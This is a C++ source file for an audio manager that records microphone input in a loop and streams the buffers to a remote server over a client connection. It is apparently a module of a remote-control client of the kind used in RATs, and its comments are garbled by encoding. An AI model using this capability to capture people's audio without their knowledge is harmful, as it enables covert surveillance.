#include "AudioManager.h"



CAudioManager::CAudioManager(_CIOCPClient* IOCPClient) :CManager(IOCPClient)
{
	m_IsWorking = FALSE;
	m_Audio = NULL;
	m_WorkThreadHandle = NULL;
	if (OnInitMember() == FALSE)
	{
		return;
	}
	BYTE  IsToken = CLIENT_AUDIO_MANAGER_REPLY;
	m_IOCPClient->OnSending((char*)&IsToken, 1);

	WaitingForServerDlgOpen();
	m_WorkThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProcedure,
		(LPVOID)this, 0, NULL);
}


CAudioManager::~CAudioManager()
{
	printf("~CAudioManager\r\n");
	m_IsWorking = FALSE;
	WaitForSingleObject(m_WorkThreadHandle, INFINITE);
	if (m_Audio != NULL)
	{
		delete  m_Audio;
		m_Audio = NULL;
	}
}
void  CAudioManager::HandleIO(PBYTE  BufferData, ULONG_PTR  BufferLength)
{
	BYTE  IsToken;
	switch (BufferData[0])
	{
	case  CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}
	

	}
}
//���������������
DWORD  CAudioManager::ThreadProcedure(LPVOID ParameterData)
{
	CAudioManager*  This = (CAudioManager*)ParameterData;
	while (This->m_IsWorking)
	{
		This->SendRecordBuffer();
	}
	printf("CAudioManager::ThreadProcedure()  �˳�\r\n");
	return 0;
}
int   CAudioManager::SendRecordBuffer()
{
	DWORD  BufferLength = 0;
	DWORD  ReturnLength = 0;
	//�õ���Ƶ����
	LPBYTE  v1 = m_Audio->GetRecordBuffer(&BufferLength);
	if (v1 == NULL)
	{
		return 0;
	}
	//���仺����
	LPBYTE  BufferData = new BYTE[BufferLength + 1];
	//��������ͷ
	BufferData[0] = CLIENT_AUDIO_MANAGER_DATA;
	//���ƻ�����
	memcpy(BufferData + 1, v1, BufferLength);
	//��������
	if (BufferLength > 0)
	{
		ReturnLength = m_IOCPClient->OnSending((char*)BufferData, BufferLength + 1);
	}
	if (BufferData != NULL)
	{
		delete  BufferData;
		BufferData = NULL;
	}
	return ReturnLength;
}
BOOL  CAudioManager::OnInitMember()
{
	if (!waveInGetNumDevs())
	{
		return  FALSE;
	}
	if (m_IsWorking == TRUE)
	{
		return FALSE;
	}
	m_Audio = new CAudio;
	m_IsWorking = TRUE;
	return  TRUE;
}